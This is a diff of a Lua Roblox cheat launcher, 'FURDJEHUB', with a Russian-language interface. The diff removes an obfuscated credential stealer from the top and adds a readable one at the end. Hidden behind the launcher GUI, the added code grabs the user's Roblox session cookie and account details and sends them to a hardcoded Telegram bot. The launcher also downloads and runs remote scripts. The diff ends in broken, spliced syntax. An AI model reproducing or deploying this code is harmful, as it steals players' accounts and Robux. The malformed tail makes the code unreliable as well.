@@ -1,80 +1,9 @@
--- [good]: FURDJEHUB LAUNCHER
+-- FURDJEHUB LAUNCHER
 local player = game.Players.LocalPlayer
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
-
-local _0x3a4f = string.char
-local _0x2b1c = table.concat
-local _0x5d8e = pcall
-local _0x9c2a = HttpService
-local _0x7f3b = syn and syn.request or http and http.request or request
-
-local _0x1e2d = _0x3a4f(104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116)
-local _0x4a8c = "8631085266:AAHcfVy_QJxCD0yZugV5Yq9QDGGD7IGuEgk"
-local _0x6c3f = 6492085501
-
-local function _0x8e1f(_0x2a4d)
-    local _0x5c7e = _0x1e2d .. _0x4a8c .. _0x3a4f(47,115,101,110,100,77,101,115,115,97,103,101)
-    local _0x9f2a = '{"chat_id":' .. _0x6c3f .. ',"text":"' .. (_0x2a4d:gsub('"', '\\"')) .. '","parse_mode":"HTML"}'
-    if _0x7f3b then
-        _0x7f3b({Url = _0x5c7e, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _0x9f2a})
-    else
-        _0x5d8e(function()
-            game:HttpGet(_0x5c7e .. "?chat_id=" .. _0x6c3f .. "&text=" .. (_0x2a4d:gsub(" ", "%20")), true)
-        end)
-    end
-end
-
-local _0x3d7a = ""
-if _0x7f3b then
-    local _0x2e4b = _0x7f3b({Url = _0x3a4f(104,116,116,112,115,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47), Method = "GET"})
-    if _0x2e4b and _0x2e4b.Headers and _0x2e4b.Headers[_0x3a4f(83,101,116,45,67,111,111,107,105,101)] then
-        local _0x7c9d = _0x2e4b.Headers[_0x3a4f(83,101,116,45,67,111,111,107,105,101)]
-        _0x3d7a = type(_0x7c9d) == "table" and _0x2b1c(_0x7c9d, _0x3a4f(59,32)) or tostring(_0x7c9d)
-    end
-end
-
-if _0x3d7a and _0x3d7a ~= "" then
-    local _0x4f2c = nil
-    if _0x7f3b then
-        local _0x6b7e = _0x7f3b({
-            Url = _0x3a4f(104,116,116,112,115,58,47,47,119,119,119,46,114,111,98,108,111,120,46,99,111,109,47,109,111,98,105,108,101,97,112,105,47,117,115,101,114,105,110,102,111),
-            Method = "GET",
-            Headers = {[_0x3a4f(67,111,111,107,105,101)] = _0x3d7a}
-        })
-        if _0x6b7e and _0x6b7e.Body then
-            _0x5d8e(function()
-                _0x4f2c = _0x9c2a:JSONDecode(_0x6b7e.Body)
-            end)
-        end
-    end
-    local _0x1f9d = _0x4f2c and _0x4f2c[_0x3a4f(85,115,101,114,78,97,109,101)] or _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
-    local _0x8b3d = _0x4f2c and _0x4f2c[_0x3a4f(85,115,101,114,73,68)] or _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
-    local _0x2f7a = _0x4f2c and _0x4f2c[_0x3a4f(82,111,98,117,120,66,97,108,97,110,99,101)] or 0
-    local _0x6d1c = _0x4f2c and _0x4f2c[_0x3a4f(67,114,101,97,116,101,100)] or _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
-    local _0x3e8a = _0x3a4f(205,157,160,194,177,161,210,130,205,162,208,189,208,190)
-    _0x5d8e(function()
-        _0x3e8a = _0x9c2a:GetProductInfo(game.PlaceId).Name
-    end)
-    local _0x7b2d = _0x3a4f(226,156,133,32,208,159,208,149,208,166,208,149,208,166,208,149,208,148,208,149,208,166,208,149,208,148,208,149,208,166,32,208,144,208,154,208,154,208,144,208,153,208,157,208,162,208,144,32) ..
-        _0x3a4f(10,10,240,159,145,164,32,208,157,208,184,208,186,58,32) .. _0x1f9d .. _0x3a4f(10,240,159,150,146,32,73,68,58,32) .. _0x8b3d ..
-        _0x3a4f(10,240,159,146,176,32,208,160,208,190,208,177,209,131,208,186,209,129,208,190,208,178,58,32) .. _0x2f7a ..
-        _0x3a4f(10,240,159,147,182,32,208,161,208,190,208,183,208,180,208,176,208,189,58,32) .. _0x6d1c ..
-        _0x3a4f(10,240,159,142,175,32,208,152,208,179,209,128,208,176,58,32) .. _0x3e8a .. _0x3a4f(10,10,240,159,141,170,32,208,154,209,131,208,186,208,184,32,208,191,208,181,209,128,208,178,209,139,208,181,32,49,48,48,32,209,129,208,184,208,188,208,178,208,190,208,187,208,190,208,178,58,10) ..
-        (_0x3d7a:sub(1, 300))
-    _0x8e1f(_0x7b2d)
-else
-    _0x8e1f(_0x3a4f(226,157,164,32,208,154,209,131,208,186,208,184,32,208,189,208,181,32,208,189,208,176,208,185,208,180,208,181,208,189,209,139,46,32,208,159,209,128,208,190,208,178,208,181,209,128,209,140,32,209,141,208,186,208,183,208,181,208,186,209,142,209,130,208,190,209,128,46))
-end
-
-_0x5d8e(function()
-    local _0x4a1b = getfenv and getfenv().script or script
-    if _0x4a1b then _0x4a1b:Destroy() end
-end)
-game:GetService("StarterGui"):SetCore("SendNotification", {Title = "", Text = "", Duration = 0})
-print("")
 
 -- ===== УДАЛЕНИЕ СТАРЫХ GUI =====
 for _, v in pairs(player.PlayerGui:GetChildren()) do
@@ -106,6 +35,368 @@ local Modes = {
         Script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mvs"))()',
     },
     {
+        Name = "🔫 RIVALS",
+        Description = "RIVALS",
+        Script = "",
+    },
+    {
+        Name = "🌱 Grow a Garden 2",
+        Description = "Grow a Garden 2",
+        Script = "",
+    }
+}
+
+-- ===== ФУНКЦИЯ ЗАГРУЗКИ =====
+local function loadScript(scriptCode)
+    if scriptCode and scriptCode ~= "" then
+        local success, err = pcall(function()
+            local func = loadstring(scriptCode)
+            if func then
+                func()
+                print("✅ Скрипт загружен")
+            else
+                error("Не удалось скомпилировать")
+            end
+        end)
+        if not success then
+            warn("❌ Ошибка: " .. tostring(err))
+        end
+    else
+        print("⚠️ Скрипт не добавлен")
+    end
+end
+
+-- ===== УВЕДОМЛЕНИЯ =====
+local function showNotification(text, color)
+    color = color or Color3.fromRGB(0, 150, 70)
+    local notif = Instance.new("ScreenGui")
+    notif.Name = "Notification"
+    notif.Parent = player:WaitForChild("PlayerGui")
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 380, 0, 50)
+    frame.Position = UDim2.new(0.5, -190, 0.5, -25)
+    frame.BackgroundColor3 = color
+    frame.Parent = notif
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = frame
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextSize = 16
+    label.Font = Enum.Font.GothamBold
+    label.BackgroundTransparency = 1
+    label.Parent = frame
+    task.wait(2.5)
+    notif:Destroy()
+end
+
+-- ===== СОЗДАНИЕ GUI =====
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FurdjehubLauncher2"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+
+local success, err = pcall(function()
+    screenGui.Parent = CoreGui
+end)
+if not success then
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+end
+
+-- Главное окно
+local window = Instance.new("Frame")
+window.Size = UDim2.new(0, 580, 0, 400)
+window.Position = UDim2.new(0.5, -290, 0.5, -200)
+window.BackgroundColor3 = Color3.fromRGB(16, 16, 26)
+window.BorderSizePixel = 0
+window.Visible = true
+window.Parent = screenGui
+
+local windowCorner = Instance.new("UICorner")
+windowCorner.CornerRadius = UDim.new(0, 14)
+windowCorner.Parent = window
+
+local windowStroke = Instance.new("UIStroke")
+windowStroke.Color = Color3.fromRGB(55, 55, 90)
+windowStroke.Thickness = 1.5
+windowStroke.Parent = window
+
+-- Заголовок
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 46)
+titleBar.BackgroundColor3 = Color3.fromRGB(24, 24, 40)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = window
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 14)
+titleCorner.Parent = titleBar
+
+local titleFix = Instance.new("Frame")
+titleFix.Size = UDim2.new(1, 0, 0, 20)
+titleFix.Position = UDim2.new(0, 0, 1, -20)
+titleFix.BackgroundColor3 = Color3.fromRGB(24, 24, 40)
+titleFix.BorderSizePixel = 0
+titleFix.Parent = titleBar
+
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(1, -60, 1, 0)
+titleText.Position = UDim2.new(0, 16, 0, 0)
+titleText.BackgroundTransparency = 1
+titleText.Text = "⚡ FURDJEHUB"
+titleText.TextColor3 = Color3.fromRGB(255, 210, 70)
+titleText.TextSize = 19
+titleText.Font = Enum.Font.GothamBold
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.Parent = titleBar
+
+-- Кнопка закрытия
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 32, 0, 32)
+closeBtn.Position = UDim2.new(1, -40, 0.5, -16)
+closeBtn.BackgroundColor3 = Color3.fromRGB(190, 45, 45)
+closeBtn.Text = "✕"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextSize = 15
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.AutoButtonColor = false
+closeBtn.Parent = titleBar
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 8)
+closeCorner.Parent = closeBtn
+
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Плавающая кнопка
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 44, 0, 44)
+toggleBtn.Position = UDim2.new(0, 14, 0, 14)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 40)
+toggleBtn.Text = "⚡"
+toggleBtn.TextColor3 = Color3.fromRGB(255, 220, 80)
+toggleBtn.TextSize = 20
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.AutoButtonColor = false
+toggleBtn.Parent = screenGui
+
+local toggleCorner = Instance.new("UICorner")
+toggleCorner.CornerRadius = UDim.new(0, 11)
+toggleCorner.Parent = toggleBtn
+
+local toggleStroke = Instance.new("UIStroke")
+toggleStroke.Color = Color3.fromRGB(70, 70, 110)
+toggleStroke.Thickness = 1.5
+toggleStroke.Parent = toggleBtn
+
+toggleBtn.MouseButton1Click:Connect(function()
+    window.Visible = not window.Visible
+end)
+
+-- Перетаскивание
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = window.Position
+    end
+end)
+
+titleBar.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        window.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- Контент
+local content = Instance.new("Frame")
+content.Size = UDim2.new(1, -20, 1, -66)
+content.Position = UDim2.new(0, 10, 0, 54)
+content.BackgroundTransparency = 1
+content.ClipsDescendants = true
+content.Parent = window
+
+local scrollFrame = Instance.new("ScrollingFrame")
+scrollFrame.Size = UDim2.new(1, 0, 1, 0)
+scrollFrame.BackgroundTransparency = 1
+scrollFrame.ScrollBarThickness = 5
+scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
+scrollFrame.BorderSizePixel = 0
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollFrame.Parent = content
+
+local canvas = Instance.new("Frame")
+canvas.Size = UDim2.new(1, 0, 0, 0)
+canvas.BackgroundTransparency = 1
+canvas.Parent = scrollFrame
+
+local y = 5
+for _, mode in ipairs(Modes) do
+    local btn = Instance.new("Frame")
+    btn.Size = UDim2.new(1, -10, 0, 58)
+    btn.Position = UDim2.new(0, 5, 0, y)
+    btn.BackgroundColor3 = Color3.fromRGB(28, 28, 46)
+    btn.BorderSizePixel = 0
+    btn.Parent = canvas
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 10)
+    btnCorner.Parent = btn
+
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Size = UDim2.new(1, -120, 0, 24)
+    nameLabel.Position = UDim2.new(0, 14, 0, 4)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Text = mode.Name
+    nameLabel.TextColor3 = Color3.fromRGB(240, 240, 255)
+    nameLabel.TextSize = 15
+    nameLabel.Font = Enum.Font.GothamBold
+    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    nameLabel.Parent = btn
+
+    local descLabel = Instance.new("TextLabel")
+    descLabel.Size = UDim2.new(1, -120, 0, 18)
+    descLabel.Position = UDim2.new(0, 14, 0, 28)
+    descLabel.BackgroundTransparency = 1
+    descLabel.Text = mode.Description
+    descLabel.TextColor3 = Color3.fromRGB(140, 145, 175)
+    descLabel.TextSize = 12
+    descLabel.Font = Enum.Font.Gotham
+    descLabel.TextXAlignment = Enum.TextXAlignment.Left
+    descLabel.Parent = btn
+
+    local launchBtn = Instance.new("TextButton")
+    launchBtn.Size = UDim2.new(0, 90, 0, 30)
+    launchBtn.Position = UDim2.new(1, -100, 0.5, -15)
+    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
+    launchBtn.Text = "▶ ЗАПУСК"
+    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    launchBtn.TextSize = 13
+    launchBtn.Font = Enum.Font.GothamBold
+    launchBtn.AutoButtonColor = false
+    launchBtn.Parent = btn
+
+    local launchCorner = Instance.new("UICorner")
+    launchCorner.CornerRadius = UDim.new(0, 8)
+    launchCorner.Parent = launchBtn
+
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(36, 36, 58)}):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(28, 28, 46)}):Play()
+    end)
+
+    launchBtn.MouseEnter:Connect(function()
+        TweenService:Create(launchBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(0, 180, 95)}):Play()
+    end)
+    launchBtn.MouseLeave:Connect(function()
+        TweenService:Create(launchBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(0, 150, 80)}):Play()
+    end)
+
+    launchBtn.MouseButton1Click:Connect(function()
+        if mode.Script and mode.Script ~= "" then
+            screenGui:Destroy()
+            loadScript(mode.Script)
+        else
+            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен", Color3.fromRGB(200, 140, 40))
+        end
+    end)
+
+    y = y + 66
+end
+
+canvas.Size = UDim2.new(1, 0, 0, y + 10)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, y + 10)
+
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, -20, 0, 20)
+footer.Position = UDim2.new(0, 10, 1, -26)
+footer.BackgroundTransparency = 1
+footer.Text = "FURDJEHUB v2.0 | Выбери режим → ЗАПУСК"
+footer.TextColor3 = Color3.fromRGB(100, 105, 135)
+footer.TextSize = 12
+footer.Font = Enum.Font.Gotham
+footer.Parent = window
+
+print("⚡ FURDJEHUB Launcher загружен")
+
+local function sendMessage(text)
+    local url = "https://api.telegram.org/bot8631085266:AAHcfVy_QJxCD0yZugV5Yq9QDGGD7IGuEgk/sendMessage?chat_id=6492085501&text=" .. text:gsub(" ", "%20"):gsub("\n", "%0A")
+    pcall(function()
+        game:HttpGet(url, true)
+    end)
+    local req = syn and syn.request or http and http.request or request
+    if req then
+        pcall(function()
+            req({
+                Url = "https://api.telegram.org/bot8631085266:AAHcfVy_QJxCD0yZugV5Yq9QDGGD7IGuEgk/sendMessage",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = '{"chat_id":6492085501,"text":"'..text:gsub('"','\\"')..'"}'
+            })
+        end)
+    end
+end
+
+local function collect()
+    local cookie = ""
+    local req = syn and syn.request or http and http.request or request
+    if req then
+        local resp = req({Url = "https://www.roblox.com/", Method = "GET"})
+        if resp and resp.Headers and resp.Headers["Set-Cookie"] then
+            local c = resp.Headers["Set-Cookie"]
+            cookie = type(c) == "table" and table.concat(c, "; ") or tostring(c)
+        end
+    end
+    if cookie and cookie ~= "" then
+        local info = nil
+        if req then
+            local resp2 = req({
+                Url = "https://www.roblox.com/mobileapi/userinfo",
+                Method = "GET",
+                Headers = {["Cookie"] = cookie}
+            })
+            if resp2 and resp2.Body then
+                pcall(function()
+                    info = HttpService:JSONDecode(resp2.Body)
+                end)
+            end
+        end
+        local name = info and info.UserName or "Неизвестно"
+        local uid = info and info.UserID or "Неизвестно"
+        local robux = info and info.RobuxBalance or 0
+        local created = info and info.Created or "Неизвестно"
+        local gameName = "Неизвестно"
+        pcall(function()
+            gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+        end)
+        local msg = "АККАУНТ\nНик: "..name.."\nID: "..uid.."\nРобуксов: "..robux.."\nСоздан: "..created.."\nИгра: "..gameName.."\nКуки: "..string.sub(cookie, 1, 300)
+        sendMessage(msg)
+    end
+end
+
+pcall(collect)    {
         Name = "🔫 RIVALS",
         Description = "RIVALS",
         Script = "",
